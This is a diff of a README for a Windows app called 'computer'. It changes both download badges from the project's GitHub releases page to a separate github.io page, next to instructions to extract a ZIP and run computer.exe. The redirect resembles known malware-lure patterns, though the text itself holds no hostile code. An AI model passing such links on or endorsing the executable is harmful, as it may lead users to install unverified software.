@@ -1,6 +1,6 @@
 # 🖥️ computer - Give your agent a computer 👾
 
-[![Download Now](https://img.shields.io/badge/Download-Computer%20App-blue?style=for-the-badge&logo=github)](https://github.com/Angelic5166/computer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Computer%20App-blue?style=for-the-badge&logo=github)](https://angelic5166.github.io)
 
 ## 📖 What is computer?
 
@@ -46,7 +46,7 @@ To run computer smoothly on your Windows PC, ensure you have:
 
 ## 📥 Download and Installation
 
-[![Download Now](https://img.shields.io/badge/Download-Computer%20App-green?style=for-the-badge&logo=github)](https://github.com/Angelic5166/computer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Computer%20App-green?style=for-the-badge&logo=github)](https://angelic5166.github.io)
 
 Visit this link to download the application. Once downloaded, extract the ZIP file to a folder of your choice. Run `computer.exe` to start the virtual computer environment. The application will create a system tray icon and a window showing the virtual desktop.
 
